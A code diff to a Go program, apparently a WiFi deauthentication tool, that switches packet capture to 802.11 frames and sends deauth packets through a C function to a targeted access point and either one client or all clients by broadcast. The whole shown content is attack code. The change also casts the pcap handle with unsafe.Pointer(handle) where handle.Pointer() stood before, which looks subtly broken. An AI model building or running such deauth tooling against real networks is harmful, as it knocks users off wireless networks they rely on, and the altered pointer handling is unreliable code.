@@ -21,8 +21,10 @@ import (
 	"os/signal"
 	"syscall"
 	"time"
+	"unsafe"
 
 	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
@@ -73,19 +75,19 @@ func channelHop(interfaceName string) {
 func capturePackets() {
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
-		ethLayer := packet.Layer(gopacket.LayerTypeEthernet)
-		if ethLayer == nil {
+		// Analyze 802.11 packets (WiFi frames)
+		dot11Layer := packet.Layer(layers.LayerTypeDot11)
+		if dot11Layer == nil {
 			continue
 		}
 
-		ethernet := ethLayer.(*gopacket.Ethernet)
+		dot11 := dot11Layer.(*layers.Dot11)
 
-		if ethernet.SrcMAC.String() == args.targetAP.String() {
+		if dot11.Address2.String() == args.targetAP.String() {
 			if args.targetClient != nil {
-				if ethernet.DstMAC.String() == args.targetClient.String() {
-					// Correctly pass handle's raw pointer to the C function
+				if dot11.Address1.String() == args.targetClient.String() {
 					C.send_control_packet(
-						(*C.pcap_t)(handle.Pointer()),
+						(*C.pcap_t)(unsafe.Pointer(handle)),
 						(*C.uint8_t)(&args.targetAP[0]),
 						(*C.uint8_t)(&args.targetClient[0]),
 						C.DEAUTH,
@@ -93,9 +95,8 @@ func capturePackets() {
 					)
 				}
 			} else {
-				// For broadcasting deauth to all clients
 				C.send_control_packet(
-					(*C.pcap_t)(handle.Pointer()),
+					(*C.pcap_t)(unsafe.Pointer(handle)),
 					(*C.uint8_t)(&args.targetAP[0]),
 					nil,
 					C.DEAUTH,
